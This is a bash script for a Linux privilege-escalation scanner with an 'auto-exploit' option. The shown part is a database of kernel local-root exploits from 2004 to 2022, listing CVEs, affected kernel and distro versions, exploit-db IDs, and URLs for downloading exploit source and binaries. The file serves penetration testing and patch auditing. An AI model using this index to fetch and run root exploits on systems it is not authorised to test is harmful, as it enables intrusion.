#!/bin/bash
# linux-vuln-detector - Linux Privilege Escalation Vulnerability Scanner & Auto-Exploit
# Version: v2.0 - Fixed & Enhanced

VERSION=v2.0

txtred=$'\033[91;1m'
txtgrn=$'\033[1;32m'
txtgray=$'\033[0;37m'
txtblu=$'\033[0;36m'
txtrst=$'\033[0m'
bldwht=$'\033[1;37m'
wht=$'\033[0;36m'
bldblu=$'\033[1;34m'
yellow=$'\033[1;93m'
lightyellow=$'\033[0;93m'

UNAME_A=""
KERNEL=""
KERNEL_ALL=""
OS=""
DISTRO=""
ARCH=""
PKG_LIST=""
KCONFIG=""
CVELIST_FILE=""

opt_fetch_bins=false
opt_fetch_srcs=false
opt_kernel_version=false
opt_uname_string=false
opt_pkglist_file=false
opt_cvelist_file=false
opt_checksec_mode=false
opt_full=false
opt_summary=false
opt_kernel_only=false
opt_userspace_only=false
opt_show_dos=false
opt_skip_more_checks=false
opt_skip_pkg_versions=false
opt_auto_exploit=false

declare -a EXPLOITS
declare -a EXPLOITS_USERSPACE
declare -a exploits_to_sort
declare -a SORTED_EXPLOITS

_ROOT_ACHIEVED=false

# ============================================================
# FUNCTION: _exploit_entry
# Membuat entry exploit dengan format yang benar (tidak menggunakan heredoc yang bermasalah)
# ============================================================
_exploit_entry() {
    local name="$1"
    local reqs="$2"
    local tags="$3"
    local rank="$4"
    shift 4
    local extras="$*"
    printf "Name: %s\nReqs: %s\nTags: %s\nRank: %s\n%s\n" "$name" "$reqs" "$tags" "$rank" "$extras"
}

# ============================================================
# KERNEL EXPLOITS DATABASE
# ============================================================
n=0

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2004-1235]${txtrst} elflbl" "pkg=linux-kernel,ver=2.4.29" "" "1" "analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/elflbl
exploit-db: 744")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2004-1235]${txtrst} uselib()" "pkg=linux-kernel,ver=2.4.29" "" "1" "analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
exploit-db: 778")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2004-1235]${txtrst} krad3" "pkg=linux-kernel,ver>=2.6.5,ver<=2.6.11" "" "1" "exploit-db: 1397")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2004-0077]${txtrst} mremap_pte" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.2" "" "1" "exploit-db: 160")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2006-2451]${txtrst} raptor_prctl" "pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17" "" "1" "exploit-db: 2031")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2006-2451]${txtrst} prctl" "pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17" "" "1" "exploit-db: 2004")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2006-2451]${txtrst} prctl2" "pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17" "" "1" "exploit-db: 2005")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2006-2451]${txtrst} prctl3" "pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17" "" "1" "exploit-db: 2006")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2006-2451]${txtrst} prctl4" "pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17" "" "1" "exploit-db: 2011")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2006-3626]${txtrst} h00lyshit" "pkg=linux-kernel,ver>=2.6.8,ver<=2.6.16" "" "1" "bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/h00lyshit
exploit-db: 2013")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2008-0600]${txtrst} vmsplice1" "pkg=linux-kernel,ver>=2.6.17,ver<=2.6.24" "" "1" "exploit-db: 5092")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2008-0600]${txtrst} vmsplice2" "pkg=linux-kernel,ver>=2.6.23,ver<=2.6.24" "" "1" "exploit-db: 5093")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2008-4210]${txtrst} ftrex" "pkg=linux-kernel,ver>=2.6.11,ver<=2.6.22" "" "1" "exploit-db: 6851")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2008-4210]${txtrst} exit_notify" "pkg=linux-kernel,ver>=2.6.25,ver<=2.6.29" "" "1" "exploit-db: 8369")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-2692]${txtrst} sock_sendpage" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30" "ubuntu=7.10,RHEL=4,fedora=4|5|6|7|8|9|10|11" "1" "exploit-db: 9479")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage2" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30" "ubuntu=9.04" "1" "analysis-url: https://xorl.wordpress.com/2009/07/16/cve-2009-1895-linux-kernel-per_clear_on_setid-personality-bypass/
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9435.tgz
exploit-db: 9435")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage3" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30" "" "1" "src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9436.tgz
exploit-db: 9436")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage(ppc)" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30" "ubuntu=8.10,RHEL=4|5" "1" "src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9641.tar.gz
exploit-db: 9641")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-2698]${txtrst} the_rebel_udp_sendmsg" "pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19" "debian=4" "1" "src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9574.tgz
exploit-db: 9574
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: spender")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-2698]${txtrst} hoagie_udp_sendmsg" "pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86" "debian=4" "1" "exploit-db: 9575
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: andi")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-2698]${txtrst} katon_udp_sendmsg" "pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86" "debian=4" "1" "src-url: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/raw/master/2009/CVE-2009-2698/katon.c
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: VxHell Labs")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-2698]${txtrst} ip_append_data" "pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86" "fedora=4|5|6,RHEL=4" "1" "analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
exploit-db: 9542
author: p0c73n1")

# Pipe.c CVEs
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-3547]${txtrst} pipe_c_1" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31" "" "1" "exploit-db: 33321")
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-3547]${txtrst} pipe_c_2" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31" "" "1" "exploit-db: 33322")
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2009-3547]${txtrst} pipe_c_3" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31" "" "1" "exploit-db: 10018")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-3301]${txtrst} ptrace_kmod2" "pkg=linux-kernel,ver>=2.6.26,ver<=2.6.34" "debian=6.0{kernel:2.6.(32|33|34|35)-(1|2|trunk)-amd64},ubuntu=(10.04|10.10){kernel:2.6.(32|35)-(19|21|24)-server}" "1" "bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/kmod2
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/ptrace-kmod
exploit-db: 15023")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-1146]${txtrst} reiserfs" "pkg=linux-kernel,ver>=2.6.18,ver<=2.6.34" "ubuntu=9.10" "1" "analysis-url: https://jon.oberheide.org/blog/2010/04/10/reiserfs-reiserfs_priv-vulnerability/
src-url: https://jon.oberheide.org/files/team-edward.py
exploit-db: 12130")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-2959]${txtrst} can_bcm" "pkg=linux-kernel,ver>=2.6.18,ver<=2.6.36" "ubuntu=10.04{kernel:2.6.32-24-generic}" "1" "bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/can_bcm
exploit-db: 14814")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-3904]${txtrst} rds" "pkg=linux-kernel,ver>=2.6.30,ver<2.6.37" "debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}" "1" "analysis-url: http://www.securityfocus.com/archive/1/514379
src-url: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
exploit-db: 15285")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-3848,CVE-2010-3850,CVE-2010-4073]${txtrst} half_nelson" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36" "ubuntu=(10.04|9.10){kernel:2.6.(31|32)-(14|21)-server}" "1" "bin-url: http://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/half-nelson3
exploit-db: 17787")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[N/A]${txtrst} caps_to_root" "pkg=linux-kernel,ver>=2.6.34,ver<=2.6.36,x86" "ubuntu=10.10" "1" "exploit-db: 15916")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-4347]${txtrst} american_sign_language" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36" "" "1" "exploit-db: 15774")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-3437]${txtrst} pktcdvd" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36" "ubuntu=10.04" "1" "exploit-db: 15150")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2010-3081]${txtrst} video4linux" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.33" "RHEL=5" "1" "exploit-db: 15024")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2012-0056]${txtrst} memodipper" "pkg=linux-kernel,ver>=3.0.0,ver<=3.1.0" "ubuntu=(10.04|11.10){kernel:3.0.0-12-(generic|server)}" "1" "analysis-url: https://git.zx2c4.com/CVE-2012-0056/about/
src-url: https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
exploit-db: 18411")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2012-0056,CVE-2010-3849,CVE-2010-3850]${txtrst} full_nelson" "pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36" "ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)},ubuntu=10.04{kernel:2.6.32-(21|24)-server}" "1" "src-url: http://vulnfactory.org/exploits/full-nelson.c
exploit-db: 15704")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2013-1858]${txtrst} CLONE_NEWUSER" "pkg=linux-kernel,ver=3.8,CONFIG_USER_NS=y" "" "1" "src-url: http://stealth.openwall.net/xSports/clown-newuser.c
analysis-url: https://lwn.net/Articles/543273/
exploit-db: 38390
author: Sebastian Krahmer")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2013-2094]${txtrst} perf_swevent" "pkg=linux-kernel,ver>=2.6.32,ver<3.8.9,x86_64" "RHEL=6,ubuntu=12.04{kernel:3.2.0-(23|29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}" "1" "analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
exploit-db: 26131
author: Andrea sorbo Bittau")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2013-2094]${txtrst} perf_swevent2" "pkg=linux-kernel,ver>=2.6.32,ver<3.8.9,x86_64" "ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic}" "1" "analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
src-url: https://cyseclabs.com/exploits/vnik_v1.c
exploit-db: 33589
author: Vitaly vnik Nikolenko")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2013-0268]${txtrst} msr" "pkg=linux-kernel,ver>=2.6.18,ver<3.7.6" "" "1" "exploit-db: 27297")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2013-1959]${txtrst} userns_root_sploit" "pkg=linux-kernel,ver>=3.0.1,ver<3.8.9" "" "1" "analysis-url: http://www.openwall.com/lists/oss-security/2013/04/29/1
exploit-db: 25450")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2013-2094]${txtrst} semtex" "pkg=linux-kernel,ver>=2.6.32,ver<3.8.9" "RHEL=6" "1" "analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
exploit-db: 25444")

# 2014
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-0038]${txtrst} timeoutpwn" "pkg=linux-kernel,ver>=3.4.0,ver<=3.13.1,CONFIG_X86_X32=y" "ubuntu=13.10" "1" "analysis-url: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
exploit-db: 31346")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-0038]${txtrst} timeoutpwn2" "pkg=linux-kernel,ver>=3.4.0,ver<=3.13.1,CONFIG_X86_X32=y" "ubuntu=(13.04|13.10){kernel:3.(8|11).0-(12|15|19)-generic}" "1" "analysis-url: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
exploit-db: 31347")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-0196]${txtrst} rawmodePTY" "pkg=linux-kernel,ver>=2.6.31,ver<=3.14.3" "" "1" "analysis-url: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
exploit-db: 33516")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-2851]${txtrst} ping_init_sock_dos" "pkg=linux-kernel,ver>=3.0.1,ver<=3.14" "" "0" "analysis-url: https://cyseclabs.com/page?n=02012016
exploit-db: 32926")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-4014]${txtrst} inode_capable" "pkg=linux-kernel,ver>=3.0.1,ver<=3.13" "ubuntu=12.04" "1" "analysis-url: http://www.openwall.com/lists/oss-security/2014/06/10/4
exploit-db: 33824")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-4699]${txtrst} ptrace_sysret" "pkg=linux-kernel,ver>=3.0.1,ver<=3.8" "ubuntu=12.04" "1" "analysis-url: http://www.openwall.com/lists/oss-security/2014/07/08/16
exploit-db: 34134")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-4943]${txtrst} PPPoL2TP_dos" "pkg=linux-kernel,ver>=3.2,ver<=3.15.6" "" "1" "analysis-url: https://cyseclabs.com/page?n=01102015
exploit-db: 36267")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-5207]${txtrst} fuse_suid" "pkg=linux-kernel,ver>=3.0.1,ver<=3.16.1" "" "1" "exploit-db: 34923")

# 2015
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2014-9322]${txtrst} BadIRET" "pkg=linux-kernel,ver>=3.0.1,ver<3.17.5,x86_64" "RHEL<=7,fedora=20" "1" "analysis-url: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
src-url: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz
author: Rafal n3rgal Wojtczuk and Adam pi3 Zabrocki")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2015-3290]${txtrst} espfix64_NMI" "pkg=linux-kernel,ver>=3.13,ver<4.1.6,x86_64" "" "1" "analysis-url: http://www.openwall.com/lists/oss-security/2015/08/04/8
exploit-db: 37722")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2015-1328]${txtrst} overlayfs" "pkg=linux-kernel,ver>=3.13.0,ver<=3.19.0" "ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic},ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}" "1" "analysis-url: http://seclists.org/oss-sec/2015/q2/717
exploit-db: 37292")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2015-8660]${txtrst} overlayfs_ovl_setattr" "pkg=linux-kernel,ver>=3.0.0,ver<=4.3.3" "" "1" "analysis-url: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
exploit-db: 39230")

# 2016
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2016-0728]${txtrst} keyring" "pkg=linux-kernel,ver>=3.10,ver<4.4.1" "" "0" "analysis-url: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
exploit-db: 40003")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2016-2384]${txtrst} usb_midi" "pkg=linux-kernel,ver>=3.0.0,ver<=4.4.8" "ubuntu=14.04,fedora=22" "1" "analysis-url: https://xairy.github.io/blog/2016/cve-2016-2384
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
exploit-db: 41999
author: Andrey xairy Konovalov")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2016-4997]${txtrst} target_offset" "pkg=linux-kernel,ver>=4.4.0,ver<=4.4.0,cmd:grep -qi ip_tables /proc/modules" "ubuntu=16.04{kernel:4.4.0-21-generic}" "1" "src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/40053.zip
exploit-db: 40049
author: Vitaly vnik Nikolenko")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2016-4557]${txtrst} double_fdput" "pkg=linux-kernel,ver>=4.4,ver<4.5.5,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1" "ubuntu=16.04{kernel:4.4.0-21-generic}" "1" "analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
exploit-db: 40759
author: Jann Horn")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2016-5195]${txtrst} dirtycow" "pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3" "debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=16.04" "4" "analysis-url: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
exploit-db: 40611
author: Phil Oester")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2016-5195]${txtrst} dirtycow2" "pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3" "debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=16.04" "4" "analysis-url: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
exploit-db: 40839
author: FireFart")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2016-8655]${txtrst} chocobo_root" "pkg=linux-kernel,ver>=4.4.0,ver<4.9,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1" "ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}" "1" "analysis-url: http://www.openwall.com/lists/oss-security/2016/12/06/1
exploit-db: 40871
author: rebel")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2016-9793]${txtrst} SO_SNDRCVBUFFORCE" "pkg=linux-kernel,ver>=3.11,ver<4.8.14,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1" "" "1" "analysis-url: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
exploit-db: 41995
author: Andrey xairy Konovalov")

# 2017
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2017-6074]${txtrst} dccp" "pkg=linux-kernel,ver>=2.6.18,ver<=4.9.11,CONFIG_IP_DCCP=y" "ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}" "1" "analysis-url: http://www.openwall.com/lists/oss-security/2017/02/22/3
exploit-db: 41458
author: Andrey xairy Konovalov")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2017-7308]${txtrst} af_packet" "pkg=linux-kernel,ver>=3.2,ver<=4.10.6,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1" "ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}" "1" "analysis-url: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
exploit-db: 41994
author: Andrey xairy Konovalov")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2017-16995]${txtrst} eBPF_verifier" "pkg=linux-kernel,ver>=4.4,ver<=4.14.8,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1" "debian=9.0,fedora=25|26|27,ubuntu=14.04|16.04|17.04" "5" "analysis-url: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
exploit-db: 45010
author: Rick Larabee")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2017-1000112]${txtrst} NETIF_F_UFO" "pkg=linux-kernel,ver>=4.4,ver<=4.13,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1" "ubuntu=14.04|16.04" "1" "analysis-url: http://www.openwall.com/lists/oss-security/2017/08/13/1
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
author: Andrey xairy Konovalov")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2017-1000253]${txtrst} PIE_stack_corruption" "pkg=linux-kernel,ver>=3.2,ver<=4.13,x86_64" "RHEL=6,RHEL=7" "1" "analysis-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
src-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
exploit-db: 42887
author: Qualys")

# 2018
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2018-5333]${txtrst} rds_atomic_free_op" "pkg=linux-kernel,ver>=4.4,ver<=4.14.13,cmd:grep -qi rds /proc/modules,x86_64" "ubuntu=16.04" "1" "src-url: https://gist.githubusercontent.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4/raw/959325819c78248a6437102bb289bb8578a135cd/cve-2018-5333-poc.c
author: wbowling")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2018-14634]${txtrst} Mutagen_Astronomy" "pkg=linux-kernel,ver>=4.14.1,ver<=4.14.54,x86_64" "debian=8,RHEL=6|7" "1" "analysis-url: https://www.qualys.com/2018/09/25/cve-2018-14634/mutagen-astronomy-integer-overflow-linux-create_elf_tables-cve-2018-14634.txt
exploit-db: 45516
author: Qualys")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2018-18955]${txtrst} subuid_shell" "pkg=linux-kernel,ver>=4.15,ver<=4.19.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1" "ubuntu=18.04,fedora=28" "1" "analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
exploit-db: 45886
author: Jann Horn")

# 2019
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2019-13272]${txtrst} PTRACE_TRACEME" "pkg=linux-kernel,ver>=4,ver<5.1.17,sysctl:kernel.yama.ptrace_scope==0,x86_64" "ubuntu=16.04|18.04,debian=9|10,fedora=30" "1" "analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
exploit-db: 47133
author: Jann Horn")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2019-15666]${txtrst} XFRM_UAF" "pkg=linux-kernel,ver>=3,ver<5.0.19,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,CONFIG_XFRM=y" "" "1" "analysis-url: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
author: Vitaly vnik Nikolenko")

# 2021
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2021-27365]${txtrst} linux_iscsi" "pkg=linux-kernel,ver<=5.11.3,CONFIG_SLAB_FREELIST_HARDENED!=y" "RHEL=8" "1" "analysis-url: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
src-url: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
author: GRIMM")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2021-3490]${txtrst} eBPF_ALU32" "pkg=linux-kernel,ver>=5.7,ver<5.12,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1" "ubuntu=20.04|21.04" "5" "analysis-url: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
src-url: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
author: chompie1337")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2021-3493]${txtrst} Ubuntu_OverlayFS" "pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64" "ubuntu=(14.04|16.04|18.04|20.04|20.10)" "1" "analysis-url: https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/
src-url: https://raw.githubusercontent.com/briskets/CVE-2021-3493/refs/heads/main/exploit.c
author: ssd-disclosure")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2021-22555]${txtrst} Netfilter_OOB" "pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6" "ubuntu=20.04" "1" "analysis-url: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
src-url: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
exploit-db: 50135
author: theflow")

# 2022
EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2022-0847]${txtrst} DirtyPipe" "pkg=linux-kernel,ver>=5.8,ver<=5.16.11" "ubuntu=(20.04|21.04),debian=11" "1" "analysis-url: https://dirtypipe.cm4all.com/
src-url: https://haxx.in/files/dirtypipez.c
exploit-db: 50808
author: blasty")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2022-0995]${txtrst} watch_queue" "pkg=linux-kernel,ver>=5.8,ver<5.16.5,x86_64" "ubuntu=21.10" "1" "analysis-url: https://github.com/Bonfee/CVE-2022-0995
src-url: https://github.com/Bonfee/CVE-2022-0995/archive/refs/heads/main.zip
author: Bonfee")

EXPLOITS[((n++))]=$(_exploit_entry "${txtgrn}[CVE-2022-2586]${txtrst} nft_object_UAF" "pkg=linux-kernel,ver>=3.16,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1" "ubuntu=(20.04)" "1" "analysis-url: https://www.openwall.com/lists/oss-security/2022/08/29/5
src-url: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
author: Alejandro Guerrero")

